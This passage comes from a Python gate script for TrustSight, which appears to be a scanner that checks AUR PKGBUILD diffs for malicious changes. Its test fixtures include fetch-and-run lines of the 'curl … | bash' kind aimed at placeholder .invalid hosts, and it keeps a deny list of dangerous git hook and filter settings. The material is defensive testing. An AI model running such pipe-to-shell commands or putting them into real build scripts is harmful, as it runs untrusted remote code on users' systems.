    # An explicit {#id} attribute wins, as used by the rules reference.
    explicit = re.search(r"\{#([\w-]+)\}\s*$", text)
    if explicit:
        return explicit.group(1)
    text = re.sub(r"`([^`]*)`", r"\1", text)
    text = re.sub(r"\*\*?([^*]*)\*\*?", r"\1", text)
    return _ATX_PUNCT_RE.sub("", text.lower()).replace(" ", "-")


# B9.  Phrases whose plain reading is "you may proceed".  A template that
# says one of these defeats B6 no matter what B6 says, because the prose is
# what most readers act on.  Checked over the template strings rather than
# at runtime, so it costs nothing and fails the build when someone adds a
# friendly-sounding string.
_PERMISSION_PHRASES = (
    "no issues", "looks fine", "looks good", "nothing to review",
    "no need to review", "safe to install", "safe to update", "safe to build",
    "you may proceed", "good to go", "all clear", "verified safe",
    "no action needed", "no concerns", "appears safe", "is safe",
)
# "clean" is banned as a verdict word but appears legitimately in prose such
# as "a clean diff".  Only the verdict-shaped uses are denied.
_PERMISSION_REGEXES = (
    r"\bpackage is clean\b", r"\bverdict:?\s*clean\b", r"\bno risk\b",
    r"\bnothing (?:to worry|suspicious found)\b",
)


def gate_no_template_grants_permission() -> Gate:
    """B9: no rendered string says or implies that reading the diff is optional.

    Including when nothing fired.  The trivial case must state a fact, not
    issue a clearance: "Only pkgver and sha256sums changed. Review the diff
    before building."
    """
    import trustsight.findings as findings
    import trustsight.verdict as verdict

    problems = []
    # Template text only.  Substituted field values are package-controlled:
    # a package legitimately named `safe-rs` or `clean-arch` must not fail
    # the build.  This is A7's separation applied to B9, templates are
    # code-owned and checked, fields are package-owned and never checked.
    strings: list[tuple[str, str]] = [
        (f"findings.TEMPLATES[{k}]", v) for k, v in findings.TEMPLATES.items()
    ]
    for module in (verdict, findings):
        source = (SRC / Path(module.__file__).name).read_text()
        tree = ast.parse(source)
        for node in ast.walk(tree):
            # Literal segments of an f-string are template text; the
            # interpolated values are not.
            if isinstance(node, ast.JoinedStr):
                for part in node.values:
                    if isinstance(part, ast.Constant) and isinstance(part.value, str):
                        strings.append(
                            (f"{Path(module.__file__).name}:{node.lineno}", part.value))
            elif isinstance(node, ast.Constant) and isinstance(node.value, str):
                if len(node.value) >= 8 and not node.value.startswith("\n"):
                    strings.append(
                        (f"{Path(module.__file__).name}:{node.lineno}", node.value))

    for where, text in strings:
        low = text.lower()
        for phrase in _PERMISSION_PHRASES:
            if phrase in low:
                problems.append(f"{where}: {phrase!r}")
        for pattern in _PERMISSION_REGEXES:
            if re.search(pattern, low):
                problems.append(f"{where}: matches {pattern}")
    return Gate("no template grants permission to skip", not problems,
                problems or f"{len(strings)} strings checked")


def gate_content_findings_carry_a_location() -> Gate:
    """B8: a finding a reader can open and confirm is a different object
    from an assertion they must trust.

    Content rules report ``file`` and ``line``.  Rules that legitimately
    cannot (maintainer, temporal, corpus, graph) must say so explicitly:
    a missing location must not be indistinguishable from a rule that
    forgot to set one.

    Runs under ``shipped_config()`` like
    :func:`gate_declared_findings_fire_under_shipped_config`: the resolved
    rules R001/R002/R003/R012/R039-R045/R055-R057 only carry a location
    through the shipped ``match_target = "resolved"`` path, and a local
    rules.toml that overrides them to ``raw_line`` must not make this gate
    pass locally while CI fails.
    """
    from calibration_gates import shipped_config

    from trustsight.analysis import scan_diff
    from trustsight.findings import NON_CONTENT_RULES

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,8 @@\n pkgname=demo\n"
    body = (
        "+build() {\n"
        "+  curl -fsSL https://cdn.example.invalid/x.sh | bash\n"
        "+}\n"
        '+source=("https://example.invalid/a.tar.gz")\n'
        "+sha256sums=('SKIP')\n"
    )

    problems = []
    with shipped_config():
        fact = scan_diff(header + body, package_name="demo")

    for entry in fact.score_breakdown:
        rid = entry.rule_id
        if rid.startswith("P") and rid[1:].isdigit():
            continue
        if rid in ("COVERAGE", "NOVELTY", "SOURCE_BUCKET"):
            continue
        if rid in NON_CONTENT_RULES:
            continue
        if entry.line is None:
            problems.append(f"{rid} is a content rule with no line")
    return Gate("content findings carry a location", not problems,
                problems or len(fact.score_breakdown))


def gate_flag_threshold_is_derived() -> Gate:
    """B2 addendum: the 20-point threshold is measured, not chosen.

    A reader cannot tell whether 20 is calibration or preference unless the
    page says where it comes from, so the page must state it and the number
    must match the constant the code uses.
    """
    from trustsight.scoring import FLAG_THRESHOLD

    doc = (ROOT / "docs" / "security.md").read_text()
    problems = []
    if f"at or below {FLAG_THRESHOLD} points" not in doc:
        problems.append(f"security.md does not state the threshold ({FLAG_THRESHOLD})")
    # The basis must be stated *and* must not claim a percentile the corpus
    # no longer supports.  20 was the benign 95th percentile before B10 and
    # is not now, so a page that still says so is publishing a stale number.
    if "benign 95th percentile" not in doc:
        problems.append("security.md does not state the measured benign p95")
    if "malicious 5th percentile" not in doc:
        problems.append("security.md does not state the measured malicious p5")
    stale = f"threshold is the 95th percentile"
    if stale in doc:
        problems.append("security.md still claims 20 is the benign 95th percentile")
    return Gate("the flag threshold is derived, not copied", not problems,
                problems or FLAG_THRESHOLD)


def gate_result_reports_what_changed() -> Gate:
    """B7: every result carries a change summary, findings or not."""
    from trustsight.analysis import scan_diff
    from trustsight.schema import PackageFact
    from trustsight.changes import ALWAYS_NOISY, summarise

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n pkgname=demo\n"
    quiet = header + "-pkgver=1.2.3\n+pkgver=1.2.4\n"
    fact = scan_diff(quiet, package_name="demo")

    problems = []
    if not fact.changes:
        problems.append("a result with no findings reported no changes either")
    if not any("1.2.4" in c for c in fact.changes):
        problems.append("the version move was not reported")
    # Always-noisy files must not be listed.
    noisy = PackageFact()
    noisy.diff_summary.file_changes = [{"path": p, "status": "modified"}
                                       for p in ALWAYS_NOISY]
    if any(p in " ".join(summarise(noisy)) for p in ALWAYS_NOISY):
        problems.append("a always-noisy file was listed")
    return Gate("a result reports what changed", not problems,
                problems or fact.changes)


def gate_change_entries_carry_no_severity() -> Gate:
    """B7: changes are context, not findings.

    They must never acquire a severity, a weight, or a place in
    ``triggered_rules``; conflating the two would corrupt the calibration
    and the reader's sense of what a finding means.
    """
    from trustsight.analysis import scan_diff

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n pkgname=demo\n"
    fact = scan_diff(header + "-pkgver=1\n+pkgver=2\n+source=(\"https://x.invalid/a\")\n",
                     package_name="demo")
    problems = []
    if not all(isinstance(c, str) for c in fact.changes):
        problems.append("a change entry is not a plain string")
    fired = {e.rule_id for e in fact.score_breakdown}
    if any(c in fired for c in fact.changes):
        problems.append("a change entry reached the score breakdown")
    return Gate("change entries carry no severity", not problems,
                problems or len(fact.changes))


def gate_positive_evidence_never_scores() -> Gate:
    """B10: declared practice is reported, never credited."""
    from trustsight.schema import NoveltyContext
    from trustsight.scoring import calculate_score

    maximal = dict(
        verification_evidence=["checksum_present", "validpgpkeys_declared",
                               "gpg_verify_present"],
        pinning_level="checksum_pinned",
    )
    buckets = {"https://github.com/a/b.tar.gz": "trusted_forge"}
    triggered = [{"rule_id": "R001", "severity": "HIGH", "name": "x", "match": ""}]

    bare, _, _ = calculate_score(triggered, {}, NoveltyContext())
    rich, breakdown, _ = calculate_score(triggered, buckets, NoveltyContext(), **maximal)

    problems = []
    if rich != bare:
        problems.append(f"declared evidence moved the score: {bare} -> {rich}")
    positives = [e for e in breakdown
                 if e.rule_id.startswith("P") and e.rule_id[1:].isdigit()]
    if not positives:
        problems.append("no declared-practice finding was emitted")
    for entry in positives:
        if entry.weight != 0 or entry.severity != "INFO":
            problems.append(f"{entry.rule_id} is {entry.severity} weight {entry.weight}")
    return Gate("positive evidence never changes the score", not problems,
                problems or sorted(e.rule_id for e in positives))


def gate_declared_findings_fire_under_shipped_config() -> Gate:
    """Every declared-practice finding is reachable with the config that ships.

    P007 was emitted from inside an ``if modifier < 0`` branch.  When B10
    set ``trusted_forge = 0`` the branch became unreachable, so the finding
    stopped existing in production while still firing in the test suite,
    whose fixture config still carried the old ``-10``.  Seven documentation
    pages described a finding that could not occur.

    This is the entry-point failure from
    [reviewing a security control](../docs/contributing/security-review.md)
    wearing a different hat: the check pointed at a configuration the tool
    does not use.  So the reachability check runs against the shipped
    config, in a temp dir, with a cold database, and uses one recipe per
    practice rather than one recipe for all of them: a single PKGBUILD
    cannot be both commit-pinned and tag-pinned, and mixing checksummed and
    SKIP sources suppresses the checksum evidence entirely.
    """
    from calibration_gates import shipped_config

    from trustsight.analysis import scan_diff
    from trustsight.config import load_config, load_rules
    from trustsight.scoring import DECLARED_REASONS

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,8 @@\n pkgname=demo\n"
    digest = "3b1f8a2c9d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8"
    recipes = {
        # A checksummed tarball is both "checksums declared" and, because
        # the digest pins the artifact, "pinned by checksum".
        "P001": header + f'+source=("https://ex.invalid/d-1.tar.gz")\n+sha256sums=(\'{digest}\')\n',
        "P005": header + f'+source=("https://ex.invalid/d-1.tar.gz")\n+sha256sums=(\'{digest}\')\n',
        "P002": header + '+validpgpkeys=(\'ABCDEF0123456789ABCDEF0123456789ABCDEF01\')\n',
        "P003": header + '+  gpg --verify d.tar.gz.asc\n',
        # A versioned path with no digest: pinned to a tag, which is the
        # weaker form, since a tag can be repointed.
        "P006": header + '+source=("https://ex.invalid/d/archive/v1.2.3.tar.gz")\n+sha256sums=(\'SKIP\')\n',
        "P007": header + '+source=("https://github.com/d/d/archive/v1.tar.gz")\n',
    }

    problems = []
    fired: dict[str, bool] = {}
    with shipped_config():
        config, rules = load_config(), load_rules()
        for expected, diff in recipes.items():
            fact = scan_diff(diff, rules=rules, config=config, package_name="demo")
            seen = {e.rule_id for e in fact.score_breakdown}
            fired[expected] = expected in seen
            if expected not in seen:
                problems.append(f"{expected} unreachable: got {sorted(seen)}")
            for entry in fact.score_breakdown:
                if entry.rule_id in DECLARED_REASONS and entry.weight != 0:
                    problems.append(f"{entry.rule_id} carries weight {entry.weight}")

    undocumented = sorted(set(DECLARED_REASONS) - set(recipes))
    if undocumented:
        problems.append(f"no reachability recipe for {undocumented}")
    return Gate("declared findings fire under the shipped config",
                not problems, problems or sorted(fired))


def gate_positive_evidence_cannot_lower_a_fatal() -> Gate:
    """B10 + B4, stated as the attack: sign the package, then steal.

    Redundant given the gate above, and kept anyway: a refactor that
    reintroduces credit should fail on the case that matters rather than
    on an abstract one.
    """
    from trustsight.schema import NoveltyContext
    from trustsight.scoring import calculate_score

    triggered = [{"rule_id": "R012", "severity": "FATAL", "name": "injection",
                  "match": ""}]
    score, _, level = calculate_score(
        triggered, {"https://github.com/a/b.tar.gz": "trusted_forge"},
        NoveltyContext(),
        verification_evidence=["checksum_present", "validpgpkeys_declared",
                               "gpg_verify_present"],
        pinning_level="checksum_pinned",
    )
    problems = []
    if score != 100:
        problems.append(f"maximal declared evidence pulled a FATAL to {score}")
    if level != "Critical":
        problems.append(f"band was {level!r}")
    return Gate("positive evidence cannot lower a FATAL", not problems,
                problems or score)


def gate_score_is_deterministic_under_a_fingerprint() -> Gate:
    """B1: same input, same instrument, same number.

    Determinism is algorithmic, not configurational: changing a rule or a
    threshold changes the score on purpose.  The fingerprint is what makes
    the claim checkable, so this asserts both halves, that a repeat run is
    identical, and that touching the instrument moves the fingerprint.
    """
    import trustsight.config as config_module

    from calibration_gates import shipped_config

    from trustsight.analysis import scan_diff
    from trustsight.config import config_fingerprint, load_config, load_rules

    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,6 @@\n pkgname=demo\n"
        "+build() {\n+  curl -fsSL https://x.invalid/s.sh | bash\n+}\n"
    )
    problems = []
    with shipped_config():
        rules, config = load_rules(), load_config()
        first = scan_diff(diff, rules=rules, config=config, package_name="demo")
        second = scan_diff(diff, rules=rules, config=config, package_name="demo")
        fingerprint = config_fingerprint()

        if first.final_score != second.final_score:
            problems.append(f"same input scored {first.final_score} then {second.final_score}")
        if [e.rule_id for e in first.score_breakdown] != [e.rule_id for e in second.score_breakdown]:
            problems.append("the breakdown differed between two identical runs")
        if config_fingerprint() != fingerprint:
            problems.append("the fingerprint moved without a configuration change")

        # ...and a different instrument must be visibly different.
        saved = config_module.load_thresholds
        config_module.load_thresholds = lambda: {"thresholds": {"probe": 1}}
        try:
            moved = config_fingerprint()
        finally:
            config_module.load_thresholds = saved
        if moved == fingerprint:
            problems.append("changing a threshold did not change the fingerprint")

    return Gate("the score is deterministic under a fixed fingerprint",
                not problems, problems or fingerprint[:23] + "...")


# A14.  Every bound that decides how much work an input can cause.  Each
# must be a module-level literal: a bound computed from the content is a
# bound the content controls.
_BOUND_CONSTANTS = {
    "rules.py": ["MAX_RULE_LINE_BYTES"],
    "tokenizer.py": ["_MAX_EXPANSION_PASSES", "_MAX_VALUE_LEN", "_MAX_LINE_LEN",
                     "_MAX_TABLE_BYTES"],
    "db.py": ["MAX_SEED_BYTES"],
    "full_aur/fetch.py": ["MAX_RESPONSE_BYTES", "MAX_TAR_MEMBERS", "_HTTP_TIMEOUT"],
    "full_aur/metadata.py": ["MAX_DECOMPRESSED_BYTES", "MAX_RESPONSE_BYTES",
                             "HTTP_TIMEOUT"],
}


def gate_every_input_bound_is_a_source_constant() -> Gate:
    """A14: no package-controlled input decides how much this process uses.

    A4 bounds what arrives, A5 what is matched, A6 what is expanded.  The
    conjunction only holds if the bounds themselves are constants: a limit
    derived from the analysed text is a limit the attacker sets.
    """
    problems = []
    found = 0
    for rel, names in _BOUND_CONSTANTS.items():
        path = SRC / rel
        if not path.exists():
            problems.append(f"{rel} is missing")
            continue
        tree = ast.parse(path.read_text())
        assigned = {}
        for node in tree.body:  # module level only
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if isinstance(target, ast.Name):
                        assigned[target.id] = node.value
        for name in names:
            value = assigned.get(name)
            if value is None:
                problems.append(f"{rel}: {name} is not a module-level assignment")
                continue
            found += 1
            # A literal, or an arithmetic tree of literals (1024 * 1024).
            for sub in ast.walk(value):
                if isinstance(sub, (ast.Name, ast.Call, ast.Attribute, ast.Subscript)):
                    problems.append(f"{rel}: {name} is computed, not a literal")
                    break
    return Gate("every input bound is a source constant", not problems,
                problems or found)


def gate_every_render_ends_with_a_direction() -> Gate:
    """B9, structurally: something must be there, rather than something absent.

    A denylist over phrasings is a treadmill; a wording nobody anticipated
    slips past it.  Requiring a direction to review cannot be bypassed by
    creative rewording, because the check fails when the direction is
    missing however the rest of the sentence reads.
    """
    from trustsight.schema import DiffSummary, PackageFact, ScoreEntry
    from trustsight.verdict import DIRECTIONS, fallback_verdict

    cases = {
        "first analysis, no versions": PackageFact(first_seen=True),
        "first analysis": PackageFact(first_seen=True, old_version="1", new_version="2"),
        "nothing fired": PackageFact(diff_summary=DiffSummary(files_changed=["PKGBUILD"])),
        "signals fired": PackageFact(
            diff_summary=DiffSummary(files_changed=["PKGBUILD"]),
            score_breakdown=[ScoreEntry(rule_id="R001", severity="HIGH", weight=25,
                                        reason="x")]),
        "fatal": PackageFact(
            diff_summary=DiffSummary(files_changed=["PKGBUILD"]),
            score_breakdown=[ScoreEntry(rule_id="R012", severity="FATAL", weight=0,
                                        reason="x")]),
    }
    problems = []
    for label, fact in cases.items():
        verdict = fallback_verdict(fact).rstrip()
        if not verdict.endswith(DIRECTIONS):
            problems.append(f"{label}: ends {verdict[-48:]!r}")
    return Gate("every result render ends with a direction to review",
                not problems, problems or sorted(cases))


def gate_no_git_filters_or_hooks() -> Gate:
    """A3: cloning executes nothing.

    libgit2 does not run git hooks on clone, and this project configures no
    ``clean``, ``smudge`` or ``fsmonitor`` filter, which are the
    git-config-driven paths where a fetch can otherwise become an
    execution.  This documents a property the library has rather than a
    control this project adds.
    """
    dangerous = ("core.fsmonitor", "filter.", "core.hooksPath", "core.hookspath",
                 "uploadpack.packObjectsHook", "diff.external", "core.pager")
    hits = []
    for path in _python_files():
        text = path.read_text()
        for lineno, line in enumerate(text.splitlines(), start=1):
            for key in dangerous:
                if key in line and not line.lstrip().startswith("#"):
                    hits.append(f"{_rel(path)}:{lineno} {key}")
        tree = ast.parse(text)
        for node in ast.walk(tree):
            # A write to a *git* config, which is `repo.config[...] = ...`
            # or a set_multivar on it.  TrustSight's own `set_config`, which
            # writes config.toml, is not this and must not be flagged.
            if isinstance(node, ast.Assign):
                for target in node.targets:
                    if (isinstance(target, ast.Subscript)
                            and isinstance(target.value, ast.Attribute)
                            and target.value.attr == "config"):
                        hits.append(f"{_rel(path)}:{node.lineno} writes git config")
            if isinstance(node, ast.Call) and _call_name(node).endswith(
                    ("config.set_multivar", "config.add_file")):
                hits.append(f"{_rel(path)}:{node.lineno} writes git config")
    return Gate("no git filters or hooks are configured", not hits, hits)


def gate_doc_cross_references_resolve() -> Gate:
    """Every link between the docs points at a file and anchor that exist.

    This is the documentation-level form of the failure B2 exists to
    prevent: renaming a heading leaves every sentence on the page true,
    and quietly breaks the links that connect one claim to another, with
    nothing failing anywhere.  It nearly happened to this model when B2's
    own heading was reworded, and heading rewording is *likely* on a page
    people keep polishing.  Eight files reference each other, so the
    check covers all of ``docs/``, not just ``security.md``.
    """
    docs = ROOT / "docs"
    if not docs.exists():
        return Gate("doc cross-references resolve", False, "docs/ is missing")

    anchors: dict[Path, set[str]] = {}
    for path in docs.rglob("*.md"):
        found = set()
        fenced = False
        for line in path.read_text().splitlines():
            if line.lstrip().startswith("```"):
                fenced = not fenced
            elif not fenced and line.startswith("#"):
                found.add(_anchor(line))
        anchors[path.resolve()] = found

    broken: list[str] = []
    for path in sorted(docs.rglob("*.md")):
        fenced = False
        for lineno, line in enumerate(path.read_text().splitlines(), start=1):
            if line.lstrip().startswith("```"):
                fenced = not fenced
                continue
            if fenced:
                continue
            # Inline code is not markup.  A rule pattern such as
            # `(?<![^\x00-\x7F])[...]` contains `](...)` and reads as a
            # link to a regex fragment otherwise.
            for target in _MD_LINK_RE.findall(_INLINE_CODE_RE.sub("`code`", line)):
                if target.startswith(("http://", "https://", "mailto:")):
                    continue
                file_part, _, anchor = target.partition("#")
                if file_part:
                    dest = (path.parent / file_part).resolve()
                    if not dest.exists():
                        broken.append(f"{_rel(path)}:{lineno} -> {target} (no such file)")
                        continue
                else:
                    dest = path.resolve()
                if anchor and anchor not in anchors.get(dest, set()):
                    broken.append(f"{_rel(path)}:{lineno} -> {target} (no such anchor)")

    checked = sum(len(v) for v in anchors.values())
    return Gate("doc cross-references resolve", not broken,
                broken or f"{checked} anchors across {len(anchors)} files")


def gate_doc_lists_every_gate(gates: list[Gate]) -> Gate:
    """``docs/security.md`` names exactly the invariants enforced here.

    The document is the claim and this script is the proof, so a gate with
    no entry is an unstated guarantee and an entry with no gate is an
    unbacked promise.  Both are failures.
    """
    name = "docs/security.md matches the gates"
    doc = ROOT / "docs" / "security.md"
    if not doc.exists():
        return Gate(name, False, "missing")
    text = doc.read_text()
    # Only the enforcement map, not every backticked first column on the
    # page: the coverage-gap table upstream has the same row shape.
    section = text.split("## Part C")[-1].split("\n## ")[0]
    documented = set(re.findall(r"^\|\s*`([^`]+)`\s*\|", section, re.MULTILINE))
    enforced = {g.name for g in gates} | {name}
    missing = sorted(enforced - documented)
    extra = sorted(documented - enforced)
    problems = []
    if missing:
        problems.append(f"enforced but undocumented: {missing}")
    if extra:
        problems.append(f"documented but unenforced: {extra}")
    return Gate(name, not problems, problems)


# ---------------------------------------------------------------------------


def run_gates() -> list[Gate]:
    gates = [
        gate_no_interpreter_calls(),
        gate_network_is_confined(),
        gate_single_network_host(),
        gate_network_reads_are_bounded(),
        gate_no_archive_extraction(),
        gate_sql_is_parameterised(),
        gate_source_urls_are_never_fetched(),
        gate_version_args_are_shape_checked(),
        gate_terminal_output_is_inert(),
        gate_rendering_is_data_driven(),
        gate_regex_input_is_bounded(),
        gate_expansion_is_bounded(),
        gate_coverage_fails_closed(),
        gate_truncation_is_visible(),
        gate_a_gap_is_always_shown_with_the_band(),
        gate_every_producer_accounts_for_coverage(),
        gate_maturity_numbers_are_not_duplicated(),
        gate_fatal_rules_cannot_be_removed(),
        gate_fatal_findings_cannot_be_suppressed(),
        gate_seed_cannot_rewrite_the_database(),
        gate_reserved_names_are_refused_everywhere(),
        gate_a_baseline_supplies_state_not_rules(),
        gate_result_reports_what_changed(),
        gate_change_entries_carry_no_severity(),
        gate_positive_evidence_never_scores(),
        gate_positive_evidence_cannot_lower_a_fatal(),
        gate_declared_findings_fire_under_shipped_config(),
        gate_score_is_deterministic_under_a_fingerprint(),
        gate_every_input_bound_is_a_source_constant(),
        gate_every_render_ends_with_a_direction(),
        gate_no_git_filters_or_hooks(),
        gate_no_template_grants_permission(),
        gate_content_findings_carry_a_location(),
        gate_flag_threshold_is_derived(),
        gate_doc_cross_references_resolve(),
    ]
    gates.append(gate_doc_lists_every_gate(gates))
    return gates


def main() -> int:
    parser = argparse.ArgumentParser(description="Run the security-model gates")
    parser.add_argument("--json", type=Path, help="Write the gate results here")
    args = parser.parse_args()

    gates = run_gates()
    width = max(len(g.name) for g in gates)
    for gate in gates:
        status = "PASS" if gate.passed else "FAIL"
        print(f"{status}  {gate.name:<{width}}  measured={gate.measured}")
        if gate.detail:
            print(f"        {gate.detail}")

    if args.json:
        args.json.write_text(
            json.dumps([g.as_dict() for g in gates], indent=2, default=str) + "\n"
        )

    failed = [g for g in gates if not g.passed]
    print(f"\n{len(gates) - len(failed)}/{len(gates)} gates passed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
